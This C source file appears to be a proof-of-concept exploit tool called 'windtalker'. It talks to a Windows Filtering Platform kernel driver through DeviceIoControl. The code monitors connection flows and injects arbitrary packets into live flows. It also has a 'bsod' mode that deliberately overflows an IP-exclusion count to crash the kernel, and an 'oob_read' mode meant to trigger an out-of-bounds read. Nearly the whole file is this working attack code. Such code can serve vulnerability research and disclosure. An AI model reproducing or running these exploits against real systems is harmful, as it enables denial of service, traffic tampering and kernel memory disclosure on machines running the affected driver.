#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Ws2tcpip.h>
#include "header.h"

// GLOBAL VARS FOR I/O COMPLETION
PTP_IO tpio;
OVERLAPPED ovlpd;
unsigned char outbuf[BUFSIZE] = { 0 };

void		parse_notification(unsigned char* buf)
{
	_CONNECTION_NOTIFICATION* connection_notification = (_CONNECTION_NOTIFICATION*)buf;
	char addr[0x100] = { 0 };

	switch (connection_notification->Header.NotificationType)
	{
		case FLOW_CLASSIFY:
			printf("[+] FLOW_CLASSIFY: \r\n");
			printf("\tFlow handle : %lld\r\n", connection_notification->FlowNotification.FlowHandle);
			printf("\tCalloutId : %d\r\n", connection_notification->FlowNotification.CalloutId);
			printf("\tProcess: %d\r\n", connection_notification->FlowNotification.ProcessId);
			if (connection_notification->FlowNotification.ProcessPathLength != 0)
				wprintf(L"\t\t%s\r\n", (wchar_t *)&buf[sizeof(_CONNECTION_NOTIFICATION)]);
			if (connection_notification->FlowNotification.Layer & 4)
				printf("\tLayer : STREAM\r\n");
			else
				printf("\tLayer : DATAGRAM\r\n");
			if (connection_notification->FlowNotification.LocalAddress.IPv4.sin_family == AF_INET)
			{
				printf("\tLocal : %s (%d)\r\n", InetNtopA(AF_INET, &connection_notification->FlowNotification.LocalAddress.IPv4.sin_addr, (PSTR)&addr, sizeof(addr)), htons(connection_notification->FlowNotification.LocalAddress.IPv4.sin_port));
				printf("\tRemote : %s (%d)\r\n", InetNtopA(AF_INET, &connection_notification->FlowNotification.RemoteAddress.IPv4.sin_addr, (PSTR)&addr, sizeof(addr)), htons(connection_notification->FlowNotification.RemoteAddress.IPv4.sin_port));
			}
			else
			{
				printf("\tLocal : %s (%d)\r\n", InetNtopA(AF_INET6, &connection_notification->FlowNotification.LocalAddress.IPv6.sin6_addr, (PSTR)&addr, sizeof(addr)), htons(connection_notification->FlowNotification.LocalAddress.IPv6.sin6_port));
				printf("\tRemote : %s (%d)\r\n", InetNtopA(AF_INET6, &connection_notification->FlowNotification.RemoteAddress.IPv6.sin6_addr, (PSTR)&addr, sizeof(addr)), htons(connection_notification->FlowNotification.RemoteAddress.IPv6.sin6_port));
			}
			break;
		case FLOW_DATA:
			printf("[+] FLOW_DATA: \r\n");
			printf("\tFlow handle : %lld\r\n", connection_notification->StreamDataNotification.FlowHandle);
			printf("\tCalloutId : %d\r\n", connection_notification->StreamDataNotification.CalloutId);
			if (connection_notification->StreamDataNotification.Layer & 4)
				printf("\tLayer : STREAM\r\n");
			else
				printf("\tLayer : DATAGRAM\r\n");
			if (connection_notification->StreamDataNotification.StreamFlags & 1)
				printf("\tPackets received : %lld\r\n", connection_notification->StreamDataNotification.PktExchanged);
			else
				printf("\tPackets sent : %lld\r\n", connection_notification->StreamDataNotification.PktExchanged);
			printf("\tPacket size : %d\r\n", connection_notification->StreamDataNotification.StreamSize);
			break;
		case NOTIF_ERROR:
			printf("[!] NOTIFICATION_ERROR: \r\n\tExpected an outbuffer length of 0x%08x.\r\n", connection_notification->ErrorNotification.NotificationSize);
			break;
		case FLOW_DELETE:
			printf("[+] FLOW_DELETE: \r\n\tFlow handle: %lld\r\n", connection_notification->FlowDeleteNotification.FlowHandle);
			break;
		default:
			break;
	}
}

void		hexdump(unsigned char* buf, size_t buf_size)
{
	unsigned int j = 0;
	
	puts("\r\n=============================================================");
	for (; j < buf_size; j++)
		printf("%02x", buf[j]);
	puts("\r\n=============================================================\r\n");
}

void	send_inject(HANDLE h, unsigned char *buf, unsigned int buf_size)
{
	unsigned char ret = 0;
	unsigned int i = 0;

	ret = DeviceIoControl(h, INJECT_CODE, buf, buf_size, NULL, 0, &i, NULL);
	if (!ret)
		printf("Unable to send inject ioctl request.\r\nLast error code: 0x%08x\r\n", GetLastError());
}

void		pkt_inject(HANDLE h, unsigned char inject_mode, char **args)
{
	unsigned char *buf = NULL;
	_IRP_INJECT* _irp_buf = NULL;
	unsigned int buf_size = 0;
	HANDLE h_pkt_file = INVALID_HANDLE_VALUE;
	unsigned int size_high = 0;

	if (inject_mode == OOB_READ)
	{
		buf = calloc(1, sizeof(_INJECT_HEADER));
		if (!buf)
		{
			printf("Couldn't allocate memory for the injection IRP\n.");
			return;
		}
		buf_size = sizeof(_INJECT_HEADER);
		_irp_buf = (_IRP_INJECT*)buf;
		_irp_buf->header.stream_size = 0;
		_irp_buf->header.layer_id = FWPS_LAYER_DATAGRAM_DATA_V4;
	}
	else {
		//READ PKT FILE
		h_pkt_file = CreateFileA(args[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (h_pkt_file == INVALID_HANDLE_VALUE)
		{
			printf("Unable to open the pkt file\r\n");
			return;
		}
		else
		{
			buf_size = GetFileSize(h_pkt_file, &size_high);
			buf = calloc(1, sizeof(_INJECT_HEADER) + buf_size);
			if (!buf)
			{
				printf("Couldn't allocate memory for the injection IRP\r\n.");
				CloseHandle(h_pkt_file);
				return;
			}
			if (!ReadFile(h_pkt_file, buf + sizeof(_INJECT_HEADER), buf_size, &size_high, NULL))
			{
				printf("Unable to read the pkt file\r\n.");
				CloseHandle(h_pkt_file);
				return;
			}
			_irp_buf = (_IRP_INJECT*)buf;
			_irp_buf->header.FlowId = atoi(args[1]);
			_irp_buf->header.callout_id = atoi(args[2]);
			_irp_buf->header.stream_size = buf_size;
			buf_size += sizeof(_INJECT_HEADER);
			switch (inject_mode)
			{
			case STREAMV6:
				_irp_buf->header.layer_id = FWPS_LAYER_STREAM_V6;
				break;
			default:
				_irp_buf->header.layer_id = FWPS_LAYER_STREAM_V4;
				break;
			}
			_irp_buf->header.stream_flags = SEND | S_NODELAY_R_PUSH | EXPEDITED;
			CloseHandle(h_pkt_file);
		}
	}
	send_inject(h, buf, buf_size);
	(void)(getchar());
	free(buf);
}

void _stdcall	io_callback(PTP_CALLBACK_INSTANCE instance, PVOID context, PVOID overlapped, ULONG IoResult, ULONG_PTR NumberOfBytesTransferred, PTP_IO io)
{
	if (IoResult != NO_ERROR)
		printf("There was a problem with the DeviceIoControl overlapped callback.\r\nError code: 0x%08x\r\n", IoResult);
	else if (NumberOfBytesTransferred != 0)
	{
		parse_notification((unsigned char *)&outbuf);
		hexdump((unsigned char*)&outbuf, NumberOfBytesTransferred);
	}
}

void		notify(HANDLE h)
{
	unsigned char ret = 0;
	unsigned int i = 0;

	while (1)
	{
		memset(&ovlpd, 0, sizeof(OVERLAPPED));
		memset(&outbuf, 0, sizeof(BUFSIZE));
		i = 0;
		StartThreadpoolIo(tpio);
		ret = DeviceIoControl(h, CONN_NOTIF_CODE, NULL, 0, &outbuf, BUFSIZE, &i, &ovlpd);
		if (!ret && GetLastError() != ERROR_IO_PENDING)
		{
			CancelThreadpoolIo(tpio);
			printf("There was a problem with the DeviceIoControl function.\r\nLast error code: 0x%08x\r\n", GetLastError());
			break;
		}
		else
			WaitForThreadpoolIoCallbacks(tpio, FALSE);
	}
}

void		ipexclu(HANDLE h, char bsod)
{
	unsigned long long count = 1;
	unsigned long long i = 0;
	unsigned char* buf = NULL;
	unsigned char ret = 0;

	// Allocate memory for sockaddr_storage structures 
	buf = calloc(1, sizeof(count) + count * sizeof(SOCKADDR_STORAGE_LH));
	if (!buf)
	{
		printf("Couldn't allocate memory for the IRP buffer.\r\nLast error code: 0x%08x\r\n", GetLastError());
		return;
	}
	// Fill with random IPv4 addresses
	srand((unsigned)time(NULL));
	for (; i < count; i++)
	{
		*(short*)(buf + sizeof(count) + i * sizeof(SOCKADDR_STORAGE_LH)) = AF_INET;
		*(int*)(buf + sizeof(count) + i * sizeof(SOCKADDR_STORAGE_LH) + 4) = rand();
	}
	// trigger OF
	if (bsod == TRUE)
		count |= 0x1000000000000000;
	*(unsigned long long*)buf = count;
	ret = DeviceIoControl(h, IP_EXCLU_CODE, buf, (DWORD)(sizeof(count) + count * sizeof(SOCKADDR_STORAGE_LH)), NULL, 0, (LPDWORD)&i, NULL);
	if (!ret)
		printf("There was a problem with the ip exclusion ioctl request.\r\nLast error code: 0x%08x\r\n", GetLastError());
	free(buf);
}

void		usage_exit()
{
	printf("Usage: <windtalker> ipexclu|bsod|notify|inject\n[injection_mode: 0 = stream_v4, 1 = stream_v6, 2 = oob_read] (PKT_FILE FLOW_HANDLE CALLOUT_ID)\n\n");
	exit(-1);
}

int			main(int argc, unsigned char ** argv)
{
	HANDLE	h_dev_obj = INVALID_HANDLE_VALUE;

	if (argc < 2)
		usage_exit();
	h_dev_obj = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	if (h_dev_obj == INVALID_HANDLE_VALUE)
	{
		printf("Unable to open an handle to the driver.\r\nLast error code: 0x%08x\r\n", GetLastError());
		exit(-1);
	}
	if (!strcmp(argv[1], "ipexclu"))
		ipexclu(h_dev_obj, FALSE);
	else if (!strcmp(argv[1], "bsod"))
		ipexclu(h_dev_obj, TRUE);
	else if (!strcmp(argv[1], "notify"))
	{
		if (tpio = CreateThreadpoolIo(h_dev_obj, io_callback, NULL, NULL))
		{
			notify(h_dev_obj);
			CloseThreadpoolIo(tpio);
		}
	}
	else if (!strcmp(argv[1], "inject"))
	{
		if (argc >= 3 && strlen(argv[2]) == 1 && (unsigned char)(*argv[2] - 0x30) <= OOB_READ)
		{
			if (atoi(argv[2]) == OOB_READ)
				pkt_inject(h_dev_obj, OOB_READ, NULL);
			else if (argc != 6)
				usage_exit();
			else
				pkt_inject(h_dev_obj, atoi(argv[2]), &argv[3]);
		}
		else
			printf("Wrong injection mode!\r\n");
	}
	else
		usage_exit();
	CloseHandle(h_dev_obj);
}